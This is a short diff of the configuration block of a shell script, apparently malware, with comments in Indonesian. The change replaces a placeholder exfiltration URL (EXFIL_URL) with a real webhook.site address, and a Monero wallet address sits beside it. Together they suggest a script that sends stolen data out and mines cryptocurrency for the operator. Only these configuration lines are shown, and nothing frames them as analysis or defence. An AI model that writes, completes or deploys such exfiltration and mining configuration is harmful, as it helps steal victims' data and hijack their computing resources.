@@ -4,7 +4,7 @@
 # CONFIGURATION
 # ==========================================
 # Ganti dengan URL Webhook.site Anda
-EXFIL_URL="https://webhook.site/GANTI-DENGAN-UUID-ANDA"
+EXFIL_URL="https://webhook.site/a8e824a9-2309-449b-91a5-9a8e0f9cbf9b"
 
 # Wallet Monero Anda
 XMR_WALLET="44fP8BsWuuo387699tZzjQbfApvMwrghidJvSJrGC7S7Fziq7GgexEML5SbA5CykJYFUb6bwvyrP2LPaRwshcfhwF58sZU7"
